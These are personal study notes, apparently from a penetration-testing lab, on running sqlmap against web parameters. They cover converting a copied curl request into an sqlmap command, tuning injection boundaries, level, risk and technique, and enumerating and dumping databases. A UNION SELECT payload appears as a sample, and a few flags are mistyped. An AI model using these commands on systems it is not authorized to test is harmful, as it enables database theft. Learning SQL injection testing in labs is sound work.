# building attack & db enumeration

## Running sqlmap on an HTTP request

- sqlmap has numerous options and switches that can be used properly to setup http requests its usage
- in many cases, such as not able to provide proper cookie value, or improper declaration of formatted POST  data, will prevent the correct detection and exploitation of the potential sqli vulnerability.

### using CURL command:

- one of the easiest way to set up an sqlmap request against the specific target with all the http parameters inside it is by using the copy as curl feature from within the Network Monitor in browser.
- open up any link or wherever you want to test for sqli injection:
    - press f12, open up the network tab and right click on the main link where sqli is to be tested.
    - then press copy, copy as curl and after that just replace curl with sqlmap and put -u flag in front of the link.
    - `curl '[http://94.237.51.163:49376/case1.php?id=1](http://94.237.51.163:49376/case1.php?id=1)' --compressed -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Referer: [http://94.237.51.163:49376/case1.php](http://94.237.51.163:49376/case1.php)' -H 'Upgrade-Insecure-Requests: 1' -H 'Priority: u=0, i'`
    - just replace curl with sqlmap and put -u flag in front of website
    

## Attack Tuning

- vector (union all select 1,2,user,4#) : central part of the payload, carrying the useful SQL code to be executed at the target.
- boundaries (<vector>- -  -) : prefix or suffix formations used at the end of vectors ( eg, #, - -  - comments) that are used for proper injection of the vector in the vulnerable SQL statement.

### Prefix/Suffix

- requirement of prefix and suffix values is in rare cases, not covered by the regular sqlmap runs:
    - `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"`
- very rare cases where we will need to put custom boundaries at end of vector, there we will be needing the use of `-- prefix` and `-- suffix`

### Level/Risk

- by default sqlmap used combination of predefined most common boundaries(prefix/suffix) along with vectors having a high chance of success in case of a vulnerable target, but there is possibility of users to use bigger sets of boundaries and vectors already incorporated in sqlmap.
    - `--level 1-5` : this option sets to level of tests to perform extending both vectors and boundaries there expectancy of success (i.e. lower the expectancy, higher the success)
    - `--risk 1-3` : extends the used vector set based on the risk of causing problems at the target side (i.e. risk of database entry loss or maybe dos)
    

## Advanced Tuning

### status codes

- when dealing with huge target response with lot of dynamic content, subtle difference between true and false could be used for better detection purposes
- `--code 200`    :  this flag is used to fixate the detection of true response to specific http code

### titles

- if the difference could be seen by inspecting the http page titles
- `--titles` : this flag could be used to instruct the detection mechanism to base the comparison based on the content of html tag

### techniques

- `--technique=BEU` : to specify to use specific techniques for sqli, to narrow down the type of payloads being used. single or many techniques can be set of BEUSTQ

# at last for fine tuning sqlmap attack:

- `-- dbms=MySQL` : database being used by server
- `--batch` : runs sqlmap in non-interactive mode, automatically using default options when prompt appears, useful for scripting and automation
- `--threads 10` : to run sqlmap using 10 threads to speed up process
- `--fresh-queries` : this flag tells sqlmap to ignore cached data and to re execute all the queries against the database
- `--time-sec 10` : sets the number of seconds to wait before considering the response to be delayed, this helps in case the server is responding slowly to queries
- `--no-cast` :  this option disables automatically type casting of data, when this is enabled sqlmap tries to automatically cast data types (e.g. converting strings into integers) which might not be necessary and this could be lead to incorrect results
- `-v 3` : to set the verbosity level of output as usual
- `--level 1-5` : to increase the number of tests sqlmap performs which can lead to better vulnerability scanning
- `--risk 1-3` : sets the risk level for test, higher risk levels enable more aggressive risk
- `--union-cols=8` : if we know the number of columns being used in the database
- `-r http_request.txt` : to give the request copied from proxy like burp after intercepting the request

## Database Enumeration after exploitation:

- `--current-user` : current user name
- `--banner` : database version banner
- `--current-db` : current database
- `--is-dba` : if the current user has administrator rights
- `--dbs` : to dump the database using sqlmap
- `-D database --tables` : to dump tables of this database
- `-D : db_to_dump` : the database whose table’s content is to be dumped
- `-T table_to_dump` : the table whose content is to be dumped
- `--dump -T table -D database`  : to dump data
- `--dump -T table -D database -C specific_column,specific_column` : to dump specific columns
- `--dump -T table -D database -where=’name like fu%’` : dump specific data based on condition
- `--dump-format html` : to specify html or sqlite format of storing dumped data
- `--start=1`   `--stop=5` : to narrow down dumping data from row numbers
- `--dump-all`   `--exclude-sysdbs` : dump data of all the databases & exclude sysdb

### Advanced Database Enumeration:

- `--schema` : to retrieve the full structure of database with there tables to have a complete overview of database architecture
- `--search -T table_name` / `-C column_name` : search flag uses inbuilt like operator it will search for `LIKE ‘table_name’`
- `--password --batch` :
- `--all --batch` : all switch combined with batch flag will do all the enumeration process on itself and provide complete details of database